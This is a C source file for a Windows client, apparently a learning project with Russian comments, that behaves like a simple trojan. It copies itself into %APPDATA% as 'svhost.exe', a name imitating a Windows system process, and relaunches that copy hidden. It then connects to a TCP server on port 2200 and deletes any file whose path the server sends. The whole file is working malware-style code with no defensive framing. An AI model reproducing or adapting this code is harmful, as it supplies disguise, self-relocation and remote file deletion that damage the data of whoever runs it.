#define _CRT_SECURE_NO_WARNINGS
#define WIN32_LEAN_AND_MEAN
#define PORT "2200"
#define MAX_MSG 256

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <shellapi.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#pragma comment(lib, "Ws2_32.lib")

SOCKET s = INVALID_SOCKET;
WSADATA wsadata;
ADDRINFO hints;
ADDRINFO* result;

void errors_f(int n) {
	if (n >= 3) closesocket(s);
	if (n >= 2 && n < 5) freeaddrinfo(result);
	if (n) WSACleanup();
	switch (n) {
	case 0:
		printf("~err: recv failed\n");
		break;
	case 1:
		printf("~err: WSAStartup failed\n");
		break;
	case 2:
		printf("~err: getaddrinfo failed\n");
		break;
	case 3:
		printf("~err: invalid socket\n");
		break;
	case 4:
		printf("~err: connection failed\n");
		break;
	case 5:
		printf("~err: send failed\n");
		break;
	case 6:
		printf("~err: shutdown failed\n");
		break;
	case 7:
		printf("goodbye!\n");
		break;
	}
	if (n) exit(0);
}

void main() {
	char* sendbuf = "hello from client";
	char recvbuf[MAX_MSG];
	

	memset(&hints, 0, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	
	char cur_file[MAX_PATH] = { 0 };
	GetModuleFileNameA(NULL, cur_file, MAX_PATH);
	//CreateFileA(cur_file, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	char* path_to_appdata;
	size_t len_p_t_a = 0;
	_dupenv_s(&path_to_appdata, &len_p_t_a, "APPDATA");	//поиск переменных окружения
	char new_file[MAX_PATH] = {""};
	strcpy(new_file, path_to_appdata);
	strcpy(&(new_file[(int)len_p_t_a - 1]), "\\svhost.exe");

	if (CopyFileA(cur_file, new_file, 1)) {
		ShellExecuteA(NULL, "open", new_file, NULL, NULL, 0);
		exit(0);
	}


	//CreateFileA(new_file, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);


	if (WSAStartup(MAKEWORD(2, 2), &wsadata)) errors_f(1);	//передача инфы по системе библиотеке/компилятору
	
	if (getaddrinfo("localhost", PORT, &hints, &result)) errors_f(2);	//раб-ет как переводчик для сокетов (преобразование различных данных)
	
	s = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
	if (s == INVALID_SOCKET) errors_f(3);
	
	if (connect(s, result->ai_addr, (int)result->ai_addrlen)) errors_f(4);	

	freeaddrinfo(result);

	if (!send(s, sendbuf, (int)strlen(sendbuf), 0)) errors_f(5);

	int r_bytes;
	do {
		memset(recvbuf, 0, MAX_MSG);
		r_bytes = recv(s, recvbuf, (int)MAX_MSG, 0);
		if (r_bytes > 0) {
			printf("%d BYTES RECEIVED!\n", r_bytes);
			printf("MSG: %s\n", recvbuf);
			if (GetFileAttributesA(recvbuf) == INVALID_FILE_ATTRIBUTES) {
				if (!send(s, "There is no such file", 23, 0)) errors_f(5);
			}
			else {
				if (DeleteFileA(recvbuf))
					send(s, "The file has been successfully deleted", 39, 0);
				else
					send(s, "~err: delete file failed", 25, 0);
			};
		}
		else if (r_bytes == 0) printf("Connecton closed!\n");
		else errors_f(0);
	} while (r_bytes > 0);

	errors_f(7);	//очистка
}